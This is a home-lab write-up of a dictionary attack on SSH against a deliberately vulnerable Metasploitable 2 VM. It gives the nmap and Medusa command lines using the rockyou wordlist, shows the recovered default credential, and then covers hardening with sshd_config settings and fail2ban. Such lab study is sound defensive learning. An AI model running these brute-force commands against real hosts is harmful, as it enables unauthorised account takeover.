# 11 — SSH Brute Force (CVE: Weak Credentials)

## Environment
- Attacker: Kali Linux 192.168.56.102
- Target: Metasploitable 2 192.168.56.101
- Date: 19 May 2026
- Port: 22

## Overview
Used Medusa to perform a dictionary attack against the SSH 
service on Metasploitable using the rockyou wordlist — a 
list of 14 million real passwords compiled from data breaches. 
Hydra was attempted first but failed due to a legacy encryption 
algorithm mismatch between modern Kali and the ancient SSH 
version on Metasploitable.

## Tools
nmap, Medusa

## Commands

```bash
nmap -p 22 192.168.56.101
medusa -h 192.168.56.101 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh
```

## Output

```text
2026-05-19 01:43:50 ACCOUNT CHECK: [ssh] Host: 192.168.56.101
(1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete)
Password: msfadmin (1 of 7 complete)

2026-05-19 01:43:50 ACCOUNT FOUND: [ssh] Host: 192.168.56.101
User: msfadmin Password: msfadmin [SUCCESS]
```

## Findings
The password msfadmin was found on the 7th attempt within 
seconds. It is a common default credential that appears near 
the top of the rockyou wordlist. The account had no brute 
force protection in place, allowing unlimited login attempts.

## Defense Applied

Edited `/etc/ssh/sshd_config`:

```text
PermitRootLogin no
MaxAuthTries 3
PasswordAuthentication no
```

Installed fail2ban to automatically ban IPs after failed attempts:

```bash
sudo apt install fail2ban -y
sudo /etc/init.d/fail2ban start
sudo /etc/init.d/ssh restart
```

Re-ran Medusa after hardening — IP was banned after 3 attempts.

## What I Learned
Weak passwords fall instantly to dictionary attacks using 
freely available wordlists. fail2ban stops most automated 
brute force attacks by banning the source IP after a set 
number of failures. Disabling password authentication 
entirely and requiring SSH keys removes the brute force 
risk completely — there is no password left to guess.
